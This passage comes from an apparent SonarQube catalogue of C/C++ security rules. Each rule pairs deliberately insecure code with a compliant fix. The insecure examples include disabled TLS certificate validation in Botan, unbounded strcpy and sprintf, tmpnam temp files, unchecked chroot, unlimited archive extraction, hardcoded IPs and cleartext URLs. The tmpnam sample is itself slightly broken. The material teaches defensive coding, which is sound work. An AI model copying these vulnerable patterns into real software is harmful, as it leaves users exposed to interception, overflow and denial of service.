<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>
  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path = tmpnam(NULL); // Sensitive
  FILE* f = fopen(tmpnam, "w");
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in "wb+" mode, and will be automatically removed on normal program exit
  FILE* f = tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1313">
              cpp:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = "10.10.0.1"; // Sensitive
dbi_conn_set_option(conn, "host", host.c_str());
dbi_conn_set_option(conn, "host", "10.10.0.1"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, "host", host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4830">
              cpp:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5801">
              cpp:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=cpp%3AS5816&rule_key=cpp%3AS5816'>S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>
  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li>
  <li> There is an overlap between source and destination </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest = malloc(strlen(src) + 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r= doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5802">
              cpp:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the "virtual root directory" created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the "jail".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application changes the working directory before or after running chroot. </li>
  <li> The application uses a path inside the jail directory as working directory. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir = "/jail/";

if (chdir(root_dir) == -1) {
  exit(-1);
}

if (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/243">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man7.org</a> - chroot </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5042">
              cpp:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries = 1000;
  const int64_t max_file_size = 1000000000; // 1 GB

  int number_of_extraced_entries = 0;
  int64_t total_file_size = 0;

  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status = 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries++;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status = 1;
      break;
    }

    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      status = -1;
      break;
    }

    int file_size = archive_entry_size(entry);
    total_file_size += file_size;
    if (total_file_size &gt; max_file_size) {
      status = 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S6069">
              cpp:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li>
</ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul>
  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li>
  <li> Check the buffer size passed to <code>snprintf</code>. </li>
</ul>
<p>If you are working in C++, other safe alternative exist:</p>
<ul>
  <li> <code>std::string</code> should be the prefered type to store strings </li>
  <li> You can format to a string using <code>std::ostringstream</code> </li>
  <li> Since C++20, <code>std::format</code> is also available to format strings </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, "%s", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), "%s", message); // Prevent overflows by enforcing a maximum size for `str` buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen = snprintf(0, 0, "%s", message);
char* buf = malloc(buflen + 1); // For the final 0
sprintf(buf, "%s", message);{code}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5332">
              cpp:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url = "http://example.com"; // Sensitive
char* ftp_url = "ftp://anonymous@example.com"; // Sensitive
char* telnet_url = "telnet://anonymous@example.com"; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp = curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, "ftp://example.com/"); // Sensitive

CURL *curl_smtp = curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, "smtp://example.com:587"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url = "https://example.com";
char* sftp_url = "sftp://anonymous@example.com";
char* ssh_url = "ssh://anonymous@example.com";
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps = curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, "ftp://example.com/");
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls = curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, "smtp://example.com:587");
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2068">
              cpp:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
